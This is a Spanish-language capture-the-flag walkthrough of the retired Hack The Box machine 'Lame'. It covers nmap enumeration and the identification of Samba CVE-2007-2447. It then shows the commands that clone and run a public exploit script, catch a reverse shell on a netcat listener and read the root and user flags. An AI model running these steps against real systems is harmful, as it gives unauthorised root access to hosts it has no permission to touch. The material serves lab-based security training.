---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Lame

`Lame` es una máquina Linux sencilla que solo requiere un exploit para obtener acceso root. Fue la primera máquina publicada en Hack The Box y, a menudo, la primera máquina para los nuevos usuarios antes de su retiro.

<figure><img src="../../.gitbook/assets/Lame.png" alt="" width="563"><figcaption></figcaption></figure>

***





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.3 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 05:10 CET
Initiating SYN Stealth Scan at 05:10
Scanning 10.10.10.3 [65535 ports]
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
SYN Stealth Scan Timing: About 23.46% done; ETC: 05:13 (0:01:41 remaining)
SYN Stealth Scan Timing: About 51.91% done; ETC: 05:12 (0:00:57 remaining)
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 05:12, 101.61s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.034s latency).
Scanned at 2025-01-26 05:10:58 CET for 102s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 101.73 seconds
           Raw packets sent: 131143 (5.770MB) | Rcvd: 121 (7.908KB)

```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.3
	[*] Open ports: 21,22,139,445,3632

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p21,22,139,445,3632 10.10.10.3 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 05:13 CET
Nmap scan report for 10.10.10.3
Host is up (0.072s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.4.7 (92%), Linux 2.6.23 (90%), Linux 2.6.8 - 2.6.30 (90%), Linksys WRV54G WAP (89%), Arris TG562G/CT cable modem (88%), Dell Integrated Remote Access Controller (iDRAC6) (88%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (88%), Linux 2.4.21 - 2.4.31 (likely embedded) (88%), Dell iDRAC 6 remote access controller (Linux 2.6) (88%), Linux 2.6.32 - 3.10 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-01-25T23:14:36-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m27s, deviation: 3h32m12s, median: 24s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   88.43 ms 10.10.16.1
2   88.57 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.38 seconds
```





```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (265).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2007-2447" %}

{% hint style="danger" %}
La funcionalidad MS-RPC en mbd en Samba 3.0.0 hasta la 3.0.25rc3 permite a atacantes remotos ejecutar comandos de su elección a través del intérprete de comandos (shell) de metacaracteres afectando a la (1) función SamrChangePassword, cuando la opción "secuencia de comandos del mapa del nombre de usuario" smb.conf está activada, y permite a usuarios remotos validados ejecutar comandos a través del intérprete de comandos (shell) de metacaracteres afectando a otras funciones MS-RPC en la (2)impresora remota y (3)gestión de ficheros compartidos.
{% endhint %}





{% embed url="https://github.com/amriunix/CVE-2007-2447" %}

```bash
❯ git clone https://github.com/amriunix/CVE-2007-2447; cd CVE-2007-2447
Clonando en 'CVE-2007-2447'...
remote: Enumerating objects: 11, done.
remote: Total 11 (delta 0), reused 0 (delta 0), pack-reused 11 (from 1)
Recibiendo objetos: 100% (11/11), listo.
Resolviendo deltas: 100% (3/3), listo.

❯ sudo apt install python python-pip

❯ pip install --user pysmb
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```





```bash
❯ python2 usermap_script.py 10.10.10.3 445 10.10.16.5 443
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.3] 33725

script /dev/null -c bash
root@lame:/# cat /root/root.txt
f00f73d7************************
root@lame:/# ls -l /home
total 16
drwxr-xr-x 2 root    nogroup 4096 Mar 17  2010 ftp
drwxr-xr-x 2 makis   makis   4096 Mar 14  2017 makis
drwxr-xr-x 2 service service 4096 Apr 16  2010 service
drwxr-xr-x 3    1001    1001 4096 May  7  2010 user
root@lame:/# cat /home/makis/user.txt
7b790a73c535f6******************
```
